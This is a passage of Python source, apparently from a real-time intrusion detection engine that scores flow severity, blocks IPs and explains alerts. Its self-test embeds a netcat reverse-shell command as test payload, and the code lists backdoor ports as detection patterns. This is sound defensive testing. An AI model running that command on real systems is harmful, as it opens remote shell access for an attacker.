        pkt_count: int, byte_count: int, duration: float,
        src_ip: str = "", dst_ip: str = "", flow: Optional[Flow] = None,
        entropy: float = 0.0
    ) -> str:
        """
        Smart severity that considers BOTH confidence AND flow context.
        Prevents normal web browsing from being classified as CRITICAL.

        Returns: CRITICAL / HIGH / MEDIUM / LOW
        """
        label_upper = label.upper()

        # ── Loopback traffic tracking (for simulator testing) ────────────────
        is_loopback = (src_ip == "127.0.0.1" and dst_ip == "127.0.0.1")

        # ── Known-safe context: common web ports with reasonable traffic ──────
        # Check both source and destination as one side will be the server
        is_common_web = (dst_port in WEB_SERVER_PORTS or src_port in WEB_SERVER_PORTS or
                         dst_port in {53, 5353} or src_port in {53, 5353})
        is_moderate_volume = pkt_count <= 250 and byte_count <= 5_000_000
        # Include UDP (QUIC) as common web traffic
        is_web_proto = proto in ("TCP", "UDP") 

        # High-port UDP is often P2P, streaming, or game traffic.
        if proto == "UDP" and dst_port > 1024 and src_port > 1024:
            if label_upper in ("EXPLOIT", "NMAP", "SCAN", "PROBE", "ATTACK"):
                # Ignore these entirely to prevent FPs on normal UDP traffic (like QUIC/DNS/games)
                return "IGNORE"

        # ── Known-dangerous context: suspicious ports, unusual patterns ───────
        is_suspicious_port = dst_port in {4444, 1337, 31337, 5555, 6667, 9001,
                                          4899, 3333, 14444}
                                          
        # (Entropy is passed in from flow.last_entropy for performance)
        pass

        # ── Refined suppression ───────────────────────────────────────────────
        # ULTRA-AGGRESSIVE SUPPRESSION FOR WEB PORTS & TRUSTED SERVICES
        # Normal browsing and internal tool traffic should NEVER be blocked by the ML model.
        is_trusted_ip = any(src_ip.startswith(p) or dst_ip.startswith(p) for p in TRUSTED_IP_PREFIXES)
        
        # Multicast / Broadcast (LLMNR, mDNS, SSDP, DHCP) - always safe to ignore generic ML
        is_multicast = src_ip.startswith("224.") or dst_ip.startswith("224.") or \
                       src_ip.startswith("239.") or dst_ip.startswith("239.") or \
                       dst_ip == "255.255.255.255"

        # Labels that are common false positives in web/encrypted traffic
        GenericMLFPs = ("ATTACK", "PROBE", "SCAN", "NMAP", "GENERIC", "ANOMALY", "ANALYSIS", 
                        "PROCESSTABLE", "MAILBOMB", "GUESS_PASSWD", "WORM", "HEARTBLEED", 
                        "DOS", "INFILTRATION", "EXPLOIT", "SNMPGUESS", "BROADCAST")

        if is_multicast:
            if label_upper in GenericMLFPs:
                return "IGNORE"

        if is_moderate_volume and not is_suspicious_port:
            # 1. Internal/Local service traffic (mitmproxy, Streamlit, etc.)
            # ALWAYS ignore generic ML labels on these ports to allow the tools to work.
            if is_loopback or src_ip.startswith("192.168.") or dst_ip.startswith("192.168."):
                if src_port in WEB_SERVER_PORTS or dst_port in WEB_SERVER_PORTS:
                    if label_upper in GenericMLFPs:
                        return "IGNORE"

            # 2. Common web traffic (80, 443)
            if is_common_web and label_upper in GenericMLFPs:
                # Bypass suppression IF it's a loopback attack (simulator testing)
                # We detect the simulator by looking for non-zero entropy OR specific ports
                if is_loopback and (entropy > 2.0 or dst_port == 80):
                    # If it's a generic label but has payload, treat as MEDIUM instead of IGNORE
                    # This allows the simulator to be seen without blocking normal traffic.
                    return "MEDIUM"
                return "IGNORE"

            # 3. Trusted IP ranges (Google, AWS, Apple, Akamai, etc.)
            if is_trusted_ip and label_upper in GenericMLFPs:
                # For trusted IPs, we only care if it's a heuristic match or critical exploit
                if label_upper in ("ATTACK", "PROBE", "SCAN", "PROCESSTABLE", "GUESS_PASSWD", "MAILBOMB", "EXPLOIT", "SNMPGUESS"):
                    return "IGNORE"
                
            if entropy == 0.0:
                if label_upper in ("EXPLOIT", "GENERIC", "ANALYSIS", "FUZZERS", "WORMS", "PROBE", "SCAN", "NMAP", "ATTACK", "BACKDOOR"):
                    return "IGNORE"
            else:
                # If there IS payload, but it's on a common port and volume is low,
                # still downgrade from CRITICAL to HIGH/MEDIUM to avoid blocking normal traffic.
                if conf >= 0.95: return "HIGH"
                return "MEDIUM"



        is_tiny_flow = pkt_count <= 3 and byte_count <= 500  # C2 beacon pattern
        is_flood = pkt_count >= 500 or (duration > 0 and pkt_count / max(duration, 0.001) >= 200)

        if is_suspicious_port:
            if conf >= 0.7:
                return "CRITICAL"
            return "HIGH"

        if label_upper == "DOS" and is_flood:
            if conf >= 0.7:
                return "CRITICAL"
            return "HIGH"

        if label_upper in ("BACKDOOR", "BACKDOORS", "SHELLCODE", "BOTNET") and is_tiny_flow:
            return "CRITICAL"

        # ── Generic confidence-based tiers (non-web, non-suspicious ports) ────
        if conf >= 0.9:
            return "HIGH"      # HIGH, not CRITICAL -- needs context escalation
        elif conf >= 0.7:
            return "HIGH"
        elif conf >= 0.5:
            return "MEDIUM"
        else:
            return "LOW"

    # ── Adaptive Response Tiers ──────────────────────────────────────────────
    @staticmethod
    def _get_response_tier(confidence: float, severity: str) -> str:
        """
        Adaptive tiered response based on severity + confidence.
        Severity is the primary driver (already context-aware).
        """
        if severity == "CRITICAL":
            return "AUTO_BLOCK"
        elif severity == "HIGH" and confidence >= 0.7:
            return "ISOLATE"
        elif severity in ("HIGH", "MEDIUM"):
            return "RATE_LIMIT"
        else:
            return "LOG"

    def _raise_alert(self, flow: Flow, attack_type: str,
                     rule: str, confidence: float, severity: str,
                     h_conf: float = 0.0, m_conf: float = 0.0, g_conf: float = 0.0):
        """
        Enhanced alert with: adaptive response tiers, SHAP explainability,
        MITRE ATT&CK mapping, Sigma/Suricata rule generation, and LLM analysis.
        """
        k = flow.key
        # Compute real-time payload features for logging + feedback loop
        try:
            payload_entropy = float(self.ml._calculate_entropy(flow.payloads)) if self.ml else 0.0
        except Exception:
            payload_entropy = 0.0
        try:
            payload_len_var = float(self.ml._calculate_payload_var(flow.payloads)) if self.ml else 0.0
        except Exception:
            payload_len_var = 0.0
        bidir_duration_ms = float(max(flow.duration(), 0.0) * 1000.0)

        # Payload preview for the dashboard (avoid binary/garbage UI)
        payload_sample_b64 = ""
        payload_sample_text = ""
        try:
            last_payload = flow.payloads[-1] if flow.payloads else b""
            sample = (last_payload or b"")[:512]
            if sample:
                payload_sample_b64 = base64.b64encode(sample).decode("ascii", errors="ignore")
                payload_sample_text = sample.decode("utf-8", errors="replace")
                payload_sample_text = "".join(c for c in payload_sample_text if c.isprintable() or c.isspace())
        except Exception:
            pass

        # ── Adaptive response tier (now uses severity, not just confidence) ───
        response_tier = self._get_response_tier(confidence, severity)

        # ── SHAP / Feature explanation (always available) ─────────────────────
        shap_text = self._get_explanation(flow, severity)

        # ── MITRE ATT&CK mapping ─────────────────────────────────────────────
        mitre_tactic = ""
        mitre_technique = ""
        if self.llm_standalone:
            try:
                mitre = self.llm_standalone.map_mitre_attack(attack_type)
                mitre_tactic = f"{mitre['tactic']} ({mitre['tactic_name']})"
                mitre_technique = f"{mitre['technique']} ({mitre['technique_name']})"
            except Exception:
                pass

        # Capture current time and ML margin synchronously
        current_time = datetime.now().isoformat(timespec="seconds")
        current_ml_margin = float(getattr(self, "_last_ml_margin", 0.0) or 0.0)

        # ── Blocking (adaptive) (Done synchronously to prevent exploit) ───────
        blocked = False
        if response_tier == "AUTO_BLOCK":
            blocked = self.fw.block(k.src_ip, f"{attack_type} [{rule}]")
        elif response_tier == "ISOLATE" and severity in ("CRITICAL", "HIGH"):
            blocked = self.fw.block(k.src_ip, f"ISOLATE:{attack_type}")

        # ── Store for feedback ────────────────────────────────────────────────
        self._last_alert_flow = flow
        self._last_alert_label = attack_type
        self._last_alert_rule = rule

        # ── Immediate Alert Firing (No blocking for LLM) ────────────────────────
        # 1. Generate local summary first (fast)
        llm_summary = self._generate_local_summary(
            flow, attack_type, rule, confidence, severity,
            shap_text, mitre_tactic
        )

        # 2. Build and fire alert object immediately
        alert = Alert(
            timestamp  = current_time,
            src_ip     = k.src_ip,
            dst_ip     = k.dst_ip,
            src_port   = k.src_port,
            dst_port   = k.dst_port,
            proto      = k.proto,
            severity   = severity,
            attack_type= attack_type,
            rule       = rule,
            confidence = confidence,
            bidirectional_duration_ms = bidir_duration_ms,
            payload_entropy = payload_entropy,
            payload_len_var = payload_len_var,
            proba_margin = current_ml_margin,
            payload_sample_b64 = payload_sample_b64,
            payload_sample_text = payload_sample_text[:400],
            llm_summary= llm_summary,
            blocked    = blocked,
            pkt_count  = flow.pkt_count,
            byte_count = flow.byte_count,
            mitre_tactic    = mitre_tactic,
            mitre_technique = mitre_technique,
            shap_explanation= shap_text[:200] if shap_text else "",
            response_tier   = response_tier,
            heuristic_confidence = h_conf,
            ml_confidence = m_conf,
            genai_confidence = g_conf,
        )
        self.alerts.fire(alert)

        # ── Async LLM Enrichment (Optional background update) ──────────────────
        def _async_llm_enrichment():
            if not (CFG["llm_enabled"] and self.llm.enabled and response_tier in ("RATE_LIMIT", "ISOLATE", "AUTO_BLOCK")):
                return
            
            enrichment = ""
            for attempt in range(2):
                result = self.llm.analyze(flow, attack_type, rule)
                if result and not result.startswith("[LLM"):
                    enrichment = result
                    break
                time.sleep(1.0)
            
            if enrichment:
                print(f"\n\033[94m[AI ANALYSIS]\033[0m \033[1m{attack_type}\033[0m: {enrichment}\n")
                sys.stdout.flush()

        threading.Thread(target=_async_llm_enrichment, daemon=True).start()

        # ── Generate Sigma/Suricata rules (background, for HIGH+) ─────────────
        if self.llm_standalone and severity in ("CRITICAL", "HIGH"):
            def _gen_rules():
                try:
                    alert_data = {
                        "attack_type": attack_type, "rule": rule,
                        "src_ip": k.src_ip, "dst_ip": k.dst_ip,
                        "src_port": k.src_port, "dst_port": k.dst_port,
                        "proto": k.proto, "confidence": confidence,
                    }
                    self.llm_standalone.generate_sigma_rule(alert_data)
                    self.llm_standalone.generate_suricata_rule(alert_data)
                except Exception as e:
                    log.debug(f"Rule gen error: {e}")
            threading.Thread(target=_gen_rules, daemon=True).start()

    # ── Explanation Engine (SHAP with smart fallback) ─────────────────────────
    def _get_explanation(self, flow: Flow, severity: str) -> str:
        """
        Always returns an explanation string. Three tiers:
        1. Real SHAP values (if shap package installed and working)
        2. Feature-importance-based explanation (uses XGBoost feature_importances_)
        3. Flow-stats-based explanation (always available, no dependencies)
        """
        k = flow.key

        # Build flow dict for analysis
        proto_num = 6 if k.proto == "TCP" else 17 if k.proto == "UDP" else 1
        flow_dict = {
            "src_ip": k.src_ip, "dst_ip": k.dst_ip,
            "src_port": int(k.src_port), "dst_port": int(k.dst_port),
            "protocol": proto_num,
            "bidirectional_packets": flow.pkt_count,
            "bidirectional_bytes": flow.byte_count,
            "bidirectional_duration_ms": flow.duration() * 1000,
            "payload_entropy": 0.0, "payload_len_var": 0.0,
            "is_high_volume": int(flow.byte_count > 1_000_000),
        }

        # Tier 1: Try real SHAP
        if self.explainer and self.explainer.available and severity in ("CRITICAL", "HIGH", "MEDIUM"):
            try:
                from ids_ips_trainer import engineer_features
                import pandas as pd
                df_f = engineer_features(pd.DataFrame([flow_dict]), verbose=False)
                meta = self.ml.predictor.meta
                X = df_f[meta["feature_cols"]].fillna(0)
                X_scaled = self.ml.predictor.scaler.transform(X)
                shap_text = self.explainer.format_for_llm(X_scaled, raw_values=flow_dict, n=3)
                if shap_text and "[SHAP" not in shap_text:
                    return shap_text
            except Exception as e:
                log.debug(f"SHAP tier-1 failed: {e}")

        # Tier 2: Feature-importance-based explanation
        if self.ml.available and self.ml.predictor:
            try:
                model = self.ml.predictor.model
                if hasattr(model, "feature_importances_"):
                    from ids_ips_trainer import engineer_features
                    import pandas as pd
                    
                    # Engineer features to get the actual column names (e.g. src_port_category)
                    df_snap = engineer_features(pd.DataFrame([flow_dict]), verbose=False)
                    
                    meta = self.ml.predictor.meta
                    importances = model.feature_importances_
                    feat_names = meta.get("feature_cols", [])
                    
                    if len(feat_names) == len(importances):
                        pairs = sorted(zip(feat_names, importances),
                                       key=lambda x: x[1], reverse=True)[:3]
                        lines = ["Key classification drivers (feature importance):"]
                        for fname, imp in pairs:
                            # Extract value from the engineered snapshot
                            val = df_snap[fname].iloc[0] if fname in df_snap.columns else "N/A"
                            try:
                                if isinstance(val, (float, np.float32, np.float64)):
                                    val_str = f"{float(val):.3f}"
                                else:
                                    val_str = str(val)
                            except Exception: val_str = str(val)
                            
                            lines.append(
                                f"  - {fname} (importance={imp:.3f}, value={val_str})"
                            )
                        return "\n".join(lines)
            except Exception as e:
                log.debug(f"Feature importance tier-2 failed: {e}")

        # Tier 3: Flow-stats-based explanation (always works)
        dur = flow.duration()
        pps = flow.pkt_count / max(dur, 0.001)
        bps = flow.byte_count / max(dur, 0.001)
        lines = ["Flow characteristics:"]
        lines.append(f"  - {k.src_ip}:{k.src_port} -> {k.dst_ip}:{k.dst_port} [{k.proto}]")
        lines.append(f"  - {flow.pkt_count} pkts, {flow.byte_count} bytes, {dur:.1f}s")
        if pps > 100:
            lines.append(f"  - HIGH packet rate: {pps:.0f} pkts/sec")
        if bps > 1_000_000:
            lines.append(f"  - HIGH bandwidth: {bps/1_000_000:.1f} MB/s")
        if int(k.dst_port) in {4444, 1337, 31337, 5555}:
            lines.append(f"  - SUSPICIOUS destination port: {k.dst_port}")
        if flow.syn_count > 10 and flow.ack_count == 0:
            lines.append(f"  - SYN flood pattern: {flow.syn_count} SYNs, 0 ACKs")
        return "\n".join(lines)

    # ── Local Summary Generator (LLM fallback) ───────────────────────────────
    @staticmethod
    def _generate_local_summary(flow: Flow, attack_type: str, rule: str,
                                confidence: float, severity: str,
                                shap_text: str, mitre_tactic: str) -> str:
        """
        Generates a meaningful alert summary WITHOUT needing an LLM.
        Called when: LLM is disabled, rate-limited, timed out, or errored.
        """
        k = flow.key
        dur = flow.duration()

        # Build confidence assessment
        if confidence >= 0.85:
            conf_word = "high"
        elif confidence >= 0.6:
            conf_word = "medium"
        else:
            conf_word = "low"

        # Sentence 1: Threat assessment
        summary = (
            f"Threat assessment ({conf_word} confidence, {confidence:.0%}): "
            f"{attack_type} detected from {k.src_ip}:{k.src_port} "
            f"to {k.dst_ip}:{k.dst_port} [{k.proto}] - "
            f"{flow.pkt_count} packets, {flow.byte_count} bytes "
            f"over {dur:.1f}s. "
        )

        # Sentence 2: Contextual action
        if severity == "CRITICAL":
            summary += (
                f"CRITICAL threat — source IP blocked immediately. "
                f"Investigate for lateral movement and check connected hosts."
            )
        elif severity == "HIGH":
            summary += (
                f"HIGH-severity alert — host isolated pending analyst review. "
                f"Check for compromised credentials or active exploitation."
            )
        elif severity == "MEDIUM":
            summary += (
                f"MEDIUM-severity alert — rate limiting applied. "
                f"Monitor for repeated patterns from this source."
            )
        else:
            summary += "LOW-severity alert — logged for trend analysis."

        # Append MITRE context if available
        if mitre_tactic:
            summary += f" | MITRE: {mitre_tactic}"

        # Append SHAP highlight (first line only)
        if shap_text and "Flow characteristics" not in shap_text:
            first_driver = shap_text.split("\n")[1] if "\n" in shap_text else ""
            if first_driver:
                summary += f" | Top driver:{first_driver.strip()}"

        return summary

    # ── Flow cleanup ─────────────────────────────────────────────────────────
    def _flow_cleaner(self):
        while not self._stop_evt.is_set():
            time.sleep(30)
            cutoff = time.time() - CFG["flow_timeout"]
            with self._flow_lock:
                expired = [k for k, f in self.flows.items() if f.last_seen < cutoff]
                for k in expired:
                    del self.flows[k]

    # ── Stats printer ─────────────────────────────────────────────────────────
    def _stats_printer(self):
        while not self._stop_evt.is_set():
            time.sleep(CFG["stats_interval"])
            if self.ml:
                try:
                    self.ml.check_for_model_updates()
                except Exception as e:
                    log.debug(f"Error checking model updates: {e}")
            with self._flow_lock:
                nflows = len(self.flows)

            drift_str = ""
            if self.drift_mon:
                drift_str = f"  drift={'ACTIVE' if self.drift_mon.is_drifting else 'stable'}"

            sched_str = ""
            if self.scheduler:
                status = self.scheduler.get_status()
                sched_str = f"  retrains={status['retrain_count']}"

            log.info(
                f"[STATS]  pkts={self.total_pkts:,}  flows={nflows}  "
                f"attacks={self.alerts.total}  "
                f"blocked_ips={len(self.fw.blocked_ips)}"
                f"{drift_str}{sched_str}"
            )

    # ── Start / Stop ─────────────────────────────────────────────────────────
    def start(self):
        ifaces = self._pick_interfaces()

        # Build adaptive features status line
        adaptive_features = []
        if self.drift_mon:
            adaptive_features.append("DriftMon")
        if self.explainer and self.explainer.available:
            adaptive_features.append("SHAP")
        if self.feedback:
            adaptive_features.append("Feedback")
        if self.scheduler:
            adaptive_features.append("AutoRetrain")
        if self.sniffer:
            adaptive_features.append("SecureSniffer")
        if self.llm_standalone:
            adaptive_features.append("RuleGen")

        adaptive_str = ", ".join(adaptive_features) if adaptive_features else "none"

        banner = f"""
{'='*55}
  Real-Time IDS/IPS Engine  STARTED
  Mode      : {self.mode}
  Interfaces: {', '.join(ifaces)}
  Blocking  : {'ENABLED (Windows Firewall)' if IS_WINDOWS and IS_ADMIN else
               'ENABLED (iptables)'         if not IS_WINDOWS and IS_ADMIN else
               'DISABLED (run as admin!)'}
  LLM       : {self.llm._active_model or 'probing...' if self.llm.enabled else 'disabled'}
  Adaptive  : {adaptive_str}
  Alert log : {CFG['alert_log']}
  Press Ctrl+C to stop
{'='*55}"""
        log.info(banner.replace("\u26a0", "!").replace("\U0001f6ab", ""))

        if not IS_ADMIN:
            log.warning("IMPORTANT: Run as Administrator for full blocking + capture!")

        # Background threads
        threading.Thread(target=self._flow_cleaner,  daemon=True).start()
        threading.Thread(target=self._stats_printer, daemon=True).start()
        self._raw_mon.start()
        self._start_manual_actions_watcher()

        # Start adaptive subsystems
        if self.sniffer:
            self.sniffer.start(blocking=False)
        if self.flow_ingester:
            self.flow_ingester.start()
        if self.scheduler:
            self.scheduler.start()

        # Main sniff loop (blocking)
        try:
            sniff(
                iface=ifaces,
                prn=self._handle_pkt,
                store=False,
                stop_filter=lambda _: self._stop_evt.is_set(),
            )
        except KeyboardInterrupt:
            pass
        except Exception as e:
            log.error(f"Sniff error: {e}")
            log.error("\u2192 Npcap not installed? Download from https://npcap.com/#download")
        finally:
            self.stop()

    def stop(self):
        log.info("\nShutting down ...")
        self._stop_evt.set()
        self._raw_mon.stop()
        self._manual_actions_stop.set()

        # Stop adaptive subsystems
        if self.sniffer:
            self.sniffer.stop()
        if self.flow_ingester:
            self.flow_ingester.stop()
        if self.scheduler:
            self.scheduler.stop()

        # Capture blocked count BEFORE cleanup (unblock_all clears the set)
        blocked_during_session = len(self.fw.blocked_ips)
        total_block_actions = self.alerts.total_blocked
        blocked_ips_list = list(self.fw.blocked_ips)

        self.fw.unblock_all()

        # Print drift report on shutdown
        if self.drift_mon:
            report = self.drift_mon.get_report()
            if report["drift_detected"]:
                log.warning(f"DRIFT was detected during session: {report['psi_scores']}")

        # Print severity breakdown
        sev_str = "  ".join(
            f"{sev}={cnt}" for sev, cnt in sorted(self.alerts._by_severity.items())
        ) if self.alerts._by_severity else "none"

        # Print blocked IPs
        if blocked_ips_list:
            log.info(f"IPs blocked during session: {', '.join(blocked_ips_list)}")

        log.info(
            f"Session summary:  packets={self.total_pkts:,}  "
            f"alerts={self.alerts.total}  "
            f"blocked={total_block_actions} (unique IPs: {blocked_during_session})  "
            f"severity=[{sev_str}]"
        )

    # ── Manual actions watcher (dashboard control) ───────────────────────────
    def _start_manual_actions_watcher(self):
        """Apply dashboard actions from `data/manual_actions.jsonl`."""
        if self._manual_actions_thread and self._manual_actions_thread.is_alive():
            return
        try:
            os.makedirs(os.path.dirname(self._manual_actions_path) or ".", exist_ok=True)
        except Exception:
            pass

        def _loop():
            log.info(f"[ADAPTIVE] Manual actions watcher: {self._manual_actions_path}")
            while not self._stop_evt.is_set() and not self._manual_actions_stop.is_set():
                try:
                    if not os.path.exists(self._manual_actions_path):
                        time.sleep(1.0)
                        continue

                    # Handle truncation/rotation
                    try:
                        if os.path.getsize(self._manual_actions_path) < self._manual_actions_offset:
                            self._manual_actions_offset = 0
                    except Exception:
                        pass

                    with open(self._manual_actions_path, "r", encoding="utf-8", errors="ignore") as f:
                        f.seek(self._manual_actions_offset)
                        for line in f:
                            line = (line or "").strip()
                            if not line:
                                continue
                            try:
                                evt = json.loads(line)
                            except Exception:
                                continue

                            action = str(evt.get("action", "")).upper().strip()
                            src_ip = str(evt.get("src_ip", "")).strip()
                            reason = str(evt.get("reason", ""))[:200]
                            if not src_ip:
                                continue

                            if action in ("ISOLATE", "BLOCK"):
                                ok = self.fw.block(src_ip, f"MANUAL:{action}:{reason}")
                                log.warning(f"[MANUAL] {action} ip={src_ip} ok={ok}")
                            elif action in ("RELEASE", "UNBLOCK"):
                                ok = self.fw.unblock(src_ip)
                                log.warning(f"[MANUAL] RELEASE ip={src_ip} ok={ok}")

                        self._manual_actions_offset = f.tell()

                    time.sleep(0.75)
                except Exception:
                    time.sleep(1.0)

        self._manual_actions_thread = threading.Thread(target=_loop, daemon=True, name="ManualActions")
        self._manual_actions_thread.start()


# ══════════════════════════════════════════════════════════════════════════════
#  QUICK SELF-TEST  (run with  python realtime_ids.py --test )
# ══════════════════════════════════════════════════════════════════════════════
def run_tests():
    print("\n" + "="*55)
    print("  IDS Self-Test Suite")
    print("="*55)

    # 1. Heuristic – suspicious port
    from scapy.all import IP, TCP
    eng  = IDSEngine()
    pkt  = IP(src="10.0.0.1", dst="192.168.100.5") / TCP(sport=55000, dport=4444, flags="S")
    flow = Flow(key=FlowKey("10.0.0.1", "192.168.100.5", 55000, 4444, "TCP"))
    flow.pkt_count = 1
    result = eng.heuristic.check(pkt, flow)
    assert result is not None, "FAIL: port 4444 not detected!"
    print(f"  [1/4]  Port-4444 heuristic  ->  {result[0]}")

    # 2. Payload signature
    from scapy.all import Raw
    pkt2  = IP(src="10.0.0.2", dst="192.168.100.5") / TCP(sport=12345, dport=80) / Raw(load=b"nc -e /bin/bash 10.0.0.2 4444")
    flow2 = Flow(key=FlowKey("10.0.0.2", "192.168.100.5", 12345, 80, "TCP"))
    flow2.pkt_count = 1
    result2 = eng.heuristic.check(pkt2, flow2)
    assert result2 is not None, "FAIL: netcat reverse shell not detected!"
    print(f"  [2/4]  Payload signature     ->  {result2[0]}")

    # 3. Port scan
    scan_eng = HeuristicEngine()
    base = IP(src="10.0.0.3", dst="192.168.100.5")
    last_result = None
    for p in range(1, 25):
        fp = FlowKey("10.0.0.3", "192.168.100.5", 54000, p, "TCP")
        fl = Flow(key=fp); fl.pkt_count = 1
        pkt_s = base / TCP(sport=54000, dport=p, flags="S")
        r = scan_eng.check(pkt_s, fl)
        if r is not None:
            last_result = r
    assert last_result and "Port Scan" in last_result[0], "FAIL: port scan not detected!"
    print(f"  [3/4]  Port-scan detection   ->  {last_result[0]}")

    # 4. LLM connectivity (skipped if no key)
    llm = eng.llm
    if llm.enabled:
        fl3 = Flow(key=FlowKey("10.0.0.4", "192.168.100.5", 9999, 4444, "TCP"))
        fl3.pkt_count = 5; fl3.byte_count = 300
        summary = llm.analyze(fl3, "Suspicious Port 4444", "SUSPICIOUS_PORT:4444")
        ok = "[LLM" not in summary.split()[0] if summary else False
        status = "OK" if ok else "WARN"
        print(f"  {status} [4/4]  LLM API response    ->  {summary[:80]}")
    else:
        print("  WARN [4/4]  LLM API test skipped (no HF_API_KEY)")

    # 5. Wired simulator anomaly: high-entropy UDP on random high port
    from scapy.all import UDP as ScapyUDP
    import os as _os
    pkt5 = IP(src="10.0.0.9", dst="192.168.100.5") / ScapyUDP(sport=55000, dport=45000) / Raw(load=_os.urandom(2048))
    flow5 = Flow(key=FlowKey("10.0.0.9", "192.168.100.5", 55000, 45000, "UDP"))
    flow5.pkt_count = 1
    flow5.byte_count = len(pkt5)
    r5 = eng.heuristic.check(pkt5, flow5)
    assert r5 is not None and "Entropy" in r5[0], "FAIL: high-entropy UDP anomaly not detected!"
    print(f"  [5/5]  High-entropy UDP anomaly -> {r5[0]}")

    print("\n  All critical tests passed.\n")


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    if "--test" in sys.argv:
        run_tests()
        sys.exit(0)

    engine = IDSEngine()
    engine.start()
